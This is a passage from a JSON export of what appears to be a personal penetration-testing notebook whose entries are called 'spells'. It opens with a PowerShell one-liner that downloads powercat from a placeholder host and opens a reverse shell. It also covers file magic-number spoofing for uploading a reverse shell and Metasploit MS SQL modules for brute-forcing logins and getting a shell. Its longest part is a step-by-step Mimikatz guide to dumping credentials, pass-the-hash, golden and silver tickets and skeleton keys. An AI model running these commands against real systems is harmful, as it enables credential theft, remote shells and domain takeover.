System.Net.WebClient).DownloadString(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;http://1.2.3.4:8000/powercat.ps1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;); powercat -c 1.2.3.4 -p 1337 -e cmd.exe&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Magic-numbers":{"slug":"spells/Magic-numbers","filePath":"spells/Magic numbers.md","title":"Magic numbers","links":["spells/PHP"],"tags":["Language/PHP","AttackCycle/AntiForensics"],"content":"Magic numbers comprise the first few bytes of a file (often, but not always, the first 4 bytes). Text files don’t have magic number, so one trick you can do is just insert four ASCII characters in the front of your file and then use a hex editor to change them to an appropriate magic number.\nThe hexeditor app is a quick-and-easy hex editor, and file can give you a sense of whether you’ve effectively spoofed a file’s magic number.\nNote that this can be a lot trickier if you’re not dealing with PHP, since many languages don’t have PHP’s concept of interpreted vs. non-interpreted bits. In these cases, you’ll need to intercept the upload request and remove the extra bytes, less you end up with an unexecutable reverse shell!","richContent":"&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Magic numbers comprise the first few bytes of a file (often, but not always, the first 4 bytes).&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Text files don’t have magic number, so one trick you can do is just insert four ASCII characters in the front of your file and then use a hex editor to change them to an appropriate magic number.&lt;/p&gt;\n&lt;p&gt;The hexeditor app is a quick-and-easy hex editor, and file can give you a sense of whether you’ve effectively spoofed a file’s magic number.&lt;/p&gt;\n&lt;p&gt;Note that this can be a lot trickier if you’re not dealing with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt;, since many languages don’t have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/PHP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/PHP&quot;&gt;PHP&lt;/a&gt;’s concept of interpreted vs. non-interpreted bits. In these cases, you’ll need to intercept the upload request and remove the extra bytes, less you end up with an unexecutable reverse shell!&lt;/p&gt;"},"spells/Match-files-to-packages-in-Debian-based-operating-systems":{"slug":"spells/Match-files-to-packages-in-Debian-based-operating-systems","filePath":"spells/Match files to packages in Debian-based operating systems.md","title":"Match files to packages in Debian-based operating systems","links":[],"tags":["HowTo","OS/Linux/Distros/Debian","AttackCycle/Reconnaissance","Application/dpkg-query"],"content":"# List all installed packages\n#\ndpkg-query -l\n \n# List files in an installed package\n#\ndpkg-query -L $PACKAGE_NAME\n \n# List the package that owns a particular file\n#\ndpkg-query -S $FULL_PATH_TO_FILE","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List all installed packages&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dpkg-query&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List files in an installed package&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dpkg-query&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -L&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PACKAGE_NAME&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List the package that owns a particular file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;dpkg-query&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -S&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FULL_PATH_TO_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Match-files-to-packages-in-Red-Hat-based-operating-systems":{"slug":"spells/Match-files-to-packages-in-Red-Hat-based-operating-systems","filePath":"spells/Match files to packages in Red Hat-based operating systems.md","title":"Match files to packages in Red Hat-based operating systems","links":[],"tags":["HowTo","OS/Linux/Distros/RedHat","OS/AIX","AttackCycle/Reconnaissance","Application/rpm"],"content":"# List all installed packages\n#\nrpm -qa\n \n# List files in an installed package\n#\nrpm -ql $PACKAGE_NAME\n \n# List the package that owns a particular file\n#\nrpm -qf $FULL_PATH_TO_FILE","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List all installed packages&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rpm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -qa&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List files in an installed package&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rpm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -ql&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PACKAGE_NAME&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# List the package that owns a particular file&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rpm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -qf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $FULL_PATH_TO_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Metasploit-MS-SQL-modules":{"slug":"spells/Metasploit-MS-SQL-modules","filePath":"spells/Metasploit MS SQL modules.md","title":"Metasploit MS SQL modules","links":["spells/MS-SQL","spells/Nmap"],"tags":["Application/MSSQL","Application/Metasploit","Application/Nmap","AttackCycle/Reconnaissance","AttackCycle/Exploitation","AttackCycle/Exploitation/BruteForcing"],"content":"Metasploit provides a lot of tools for enumerating and exploiting MS SQL.\n\nauxiliary/scanner/mssql/mssql_ping — Discover MS SQL servers (alternatively, use --script=ms-sql-info with Nmap)\nauxiliary/scanner/mssql/mssql_login — Brute force logins\nauxiliary/admin/mssql/mssql_enum — Enumerate databases\nexploit/windows/mssql/mssql_payload — Get a shell\n","richContent":"&lt;p&gt;Metasploit provides &lt;a href=&quot;https://github.com/slyth11907/Cheatsheets/blob/master/Cheatsheet_AttackingMSSQL.txt&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a lot of tools&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for enumerating and exploiting &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MS-SQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MS-SQL&quot;&gt;MS SQL&lt;/a&gt;.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;auxiliary/scanner/mssql/mssql_ping&lt;/code&gt; — Discover &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MS-SQL&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MS-SQL&quot;&gt;MS SQL&lt;/a&gt; servers (alternatively, use &lt;code&gt;--script=ms-sql-info&lt;/code&gt; with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;auxiliary/scanner/mssql/mssql_login&lt;/code&gt; — Brute force logins&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;auxiliary/admin/mssql/mssql_enum&lt;/code&gt; — Enumerate databases&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;exploit/windows/mssql/mssql_payload&lt;/code&gt; — Get a shell&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Mimikatz":{"slug":"spells/Mimikatz","filePath":"spells/Mimikatz.md","title":"Mimikatz","links":["spells/NTLM-hashes","spells/Mimikatz","spells/whoami","spells/XFreeRDP","spells/Impacket","spells/Evil-WinRM","spells/Kerberos","spells/Golden-and-silver-ticket-attacks","spells/Call-Mimikatz-from-a-meterpreter-shell","spells/Invoke-Mimikatz"],"tags":["Application/Mimikatz","AttackCycle/Reconnaissance","AttackCycle/LateralMovement","AttackCycle/PrivEsc","OS/Windows/ActiveDirectory","Protocol/Kerberos","Cryptography/Hashes/NT","Application/PsExec","Application/Evil-WinRM","Application/XFreeRDP","OS/Windows/LSASS","OS/Windows/SAM","AttackCycle/LateralMovement/SilverTickets","AttackCycle/PrivEsc/GoldenTickets","AttackCycle/PrivEsc/PassTheHash","AttackCycle/LateralMovement/PassTheHash"],"content":"Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt.\n\nUse the privilege::debug command to check if you’re running with the right privileges.\nUse log $FILENAME to log all output.\n\nDumping cleartext passwords\nThe WDigest process caches cleartext passwords for recently logged in users. Or at least it used to. This behavior is disabled on modern Windows systems, but can be re-enabled by a single registry edit:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\nOnce this is set, Mimikatz can dump any cleartext passwords that WDigest caches. (Obviously, this only applies to logins made after the registry key above is set.)\nprivilege::debug\ntoken::elevate\nsekurlsa::wdigest\n\nNote that accounts in the “Protected Users” group will not have their credentials cached, even with the above registry hack.\nPass the hash\nNLTM hashes in LSASS memory - NLTM hashes in the local SAM = NLTM hashes for domain users!\nLocal SAM\nThis provides NLTM hashes for local users:\nprivilege::debug\ntoken::elevate\nlsadump::sam\n\nLSASS memory\nThis provides NLTM hashes for recently logged in users:\nprivilege::debug\ntoken::elevate\nsekurlsa::msv\n\nCached passwords are dumped as plain text, instead of NTHashes.\nThe LSASS process can be protected against memory-based attacks. This protection can be bypassed by loading the mimidrv.sys driver and then executing !processprotect /process:lsass.exe /remove from within the Mimikatz shell.\nInject an NTLM hash into a process\nCommands (including reverse shells, if the necessary binaries/scripts are available) can be launched from Mimikatz using the extracted NTLM hash for authentication. Note that this doesn’t work if your privileges are elevated (weird, right?), hence the initial token::revert command:\ntoken::revert\nsekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /ntlm:$TARGET_USER_NTLM_HASH /run:&quot;$FULL_COMMAND_INCLUDING_ARGUMENTS&quot;\n\nThe shell produced in this way is a bit weird, as it is actually running as the user that launched Mimikatz (which will show up if you call whoami, though the privileges will be those of the $TARGET_USER.\nA number of Linux commands can also take NLTM hashes instead of passwords, such as XFreeRDP, Impacket’s PsExec, and Evil-WinRM.\nDumping Kerberos tickets\nMimikatz can dump ticket granting tickets (and session keys) from the memory of Windows’ Local Security Authority Subsystem Service (LSASS); these can then be used to for privilege elevation or lateral movement (depending on which users are active on that machine).\nUse the sekurlsa::tickets /export command to dump any Kerberos “tickets” (really ticket + session key data structures) from LSASS’s memory as .kirbi files. Tickets are named like ID-USER-SERVICE-DOMAIN.kirbi; ticket granting tickets have a krbtgt SERVICE name. If you can find a krbtgt ticket belonging to an administrator account, then you’ve (almost) struck gold.\nPass the ticket attacks\nMimikatz can extract Kerberos TGT/TGS tickets and session keys:\nprivilege::debug\nsekurlsa::tickets /export\n\nNote that TGTs for all users are available if you can run as SYSTEM; these allow TGS tickets to be requested for any service the corresponding user has access to. If you’re not running as SYSTEM, then you can get TGS tickets for the current user, which will give you access to those services the current user has permission to use (and has accessed recently).\nMimikatz can then inject tickets into the current session:\nkerberos::ptt $KIRBI_FILENAME_FOR_TICKET_TO_INJECT\n\nThis allows the account you’re logged in as to (automatically!) “pass the ticket” and impersonate the user whose ticket you’ve harvested. The Windows built-in command klist will provide a list of currently active tickets.\nGolden and silver ticket attacks\nTo generate Kerberos golden and silver tickets using Mimikatz, begin by running the lsadump::lsa /inject /name:$SERVICE command to retrieve the service SID and NTLM password hash for that service. If SERVICE is krbtgt then this will allow the creation of a golden ticket, otherwise you’ll be creating a silver ticket.\n(You can also use a user name instead of $SERVICE, in which case it appears that Mimikatz will just request a ticket granting ticket from the KDC as that user in the next step; this is theoretically just as noisy as a golden ticket, but looks more “normal”.)\nTo actually create and cache the ticket, use Kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /id:$TYPE, where:\n\n$USER is the user to create the ticket for (probably the one you’ve compromised).\n$DOMAIN is the domain to create the ticket for.\n$SID is the SID of the service from the previous step.\n$HASH is the NT hash of the service password from the previous step.\n$TYPE is the type of Kerberos ticket to create; use 500 for a golden (ticket granting) ticket, and 1103 for a service ticket.\n\nOnce the ticket has been created, use misc::cmd to open a command prompt using the newly forged ticket.\nPass the key attacks\n“Pass the key” attacks rely on the fact that Kerberos TGTs are granted based on an encrypted timestamp, so if we can get access to these objects we can request TGTs as the corresponding user. Turns out that these also hang out in memory and can be extracted with Mimikatz:\nprivilege::debug\nsekurlsa::ekeys\n\nThese keys can be injected into a command environment just like an NTLM hash, though you need to know how they’re encrypted. For example, for an AES256 encrypted key:\ntoken::revert\nsekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /aes256:$TARGET_USER_KERBEROS_KEY /run:&quot;$FULL_COMMAND_INCLUDING_ARGUMENTS&quot;\n\nOther options include /aes128 and /rc4 for those styles of encryption, though RC4 isn’t something that you’re likely to see as it’s weak and disabled by default. (Because of a historical quirk, the RC4 key is actually not a timestamp, but rather the user’s NTLM hash. So iff RC4 is enabled on a domain, then extracting a user’s NTLM hash is sufficient to request Kerberos TGTs as that user!)\nKDC skeleton key\nIf Mimikatz is run on a domain controller, it can modify the authentication service’s memory using the misc::skeleton command to cause it to attempt to decrypt the AS-REQ using both the user’s NT hash and an NT hash of your choosing (by default 60BA4FCADC466C7A033C178194C03DF6, which is just mimikatz).  This means that you can send an AS-REQ as any user using the “skeleton key” hash to gain access as that user, similar to a golden ticket attack.\nObviously this isn’t very persistent itself, as the skeleton key will be lost if the server is rebooted or the authentication service restarted.\nOther implementations\nmeterpreter\nTransclude of Call-Mimikatz-from-a-meterpreter-shell\nPure PowerShell implementation\nTransclude of Invoke-Mimikatz","richContent":"&lt;p&gt;Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Use the &lt;code&gt;privilege::debug&lt;/code&gt; command to check if you’re running with the right privileges.&lt;/li&gt;\n&lt;li&gt;Use &lt;code&gt;log $FILENAME&lt;/code&gt; to log all output.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;dumping-cleartext-passwords&quot;&gt;Dumping cleartext passwords&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#dumping-cleartext-passwords&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The WDigest process caches &lt;em&gt;cleartext&lt;/em&gt; passwords for recently logged in users. Or at least it used to. This behavior is disabled on modern Windows systems, but can be re-enabled by a single registry edit:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;v UseLogonCredential &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;t REG_DWORD &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;d &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Once this is set, Mimikatz can dump any cleartext passwords that WDigest caches. (Obviously, this only applies to logins made &lt;em&gt;after&lt;/em&gt; the registry key above is set.)&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;privilege::debug\ntoken::elevate\nsekurlsa::wdigest\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Note that accounts in the “Protected Users” group will &lt;em&gt;not&lt;/em&gt; have their credentials cached, even with the above registry hack.&lt;/p&gt;\n&lt;h2 id=&quot;pass-the-hash&quot;&gt;Pass the hash&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#pass-the-hash&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; in LSASS memory - &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; in the local SAM = &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; for domain users!&lt;/p&gt;\n&lt;h3 id=&quot;local-sam&quot;&gt;Local SAM&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#local-sam&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;This provides &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; for &lt;em&gt;local&lt;/em&gt; users:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;privilege::debug\ntoken::elevate\nlsadump::sam\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=&quot;lsass-memory&quot;&gt;LSASS memory&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#lsass-memory&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;This provides &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; for &lt;em&gt;recently logged in&lt;/em&gt; users:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;privilege::debug\ntoken::elevate\nsekurlsa::msv\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Cached passwords are dumped as &lt;em&gt;plain text&lt;/em&gt;, instead of NTHashes.&lt;/p&gt;\n&lt;p&gt;The LSASS process can be protected against memory-based attacks. This protection can be bypassed by loading the mimidrv.sys driver and then executing &lt;code&gt;!processprotect /process:lsass.exe /remove&lt;/code&gt; from within the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Mimikatz&quot;&gt;Mimikatz&lt;/a&gt; shell.&lt;/p&gt;\n&lt;h3 id=&quot;inject-an-ntlm-hash-into-a-process&quot;&gt;Inject an NTLM hash into a process&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#inject-an-ntlm-hash-into-a-process&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Commands (including reverse shells, if the necessary binaries/scripts are available) can be launched from Mimikatz using the extracted NTLM hash for authentication. Note that this &lt;em&gt;doesn’t&lt;/em&gt; work if your privileges are elevated (weird, right?), hence the initial &lt;code&gt;token::revert&lt;/code&gt; command:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;token::revert\nsekurlsa::pth /user:$TARGET_USER /domain:$TARGET_DOMAIN /ntlm:$TARGET_USER_NTLM_HASH /run:&quot;$FULL_COMMAND_INCLUDING_ARGUMENTS&quot;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The shell produced in this way is a bit weird, as it is actually running as the user that launched Mimikatz (which will show up if you call &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/whoami&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/whoami&quot;&gt;whoami&lt;/a&gt;, though the privileges will be those of the &lt;code&gt;$TARGET_USER&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;A number of Linux commands can also take &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; instead of passwords, such as &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/XFreeRDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/XFreeRDP&quot;&gt;XFreeRDP&lt;/a&gt;, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt;’s PsExec, and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Evil-WinRM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Evil-WinRM&quot;&gt;Evil-WinRM&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 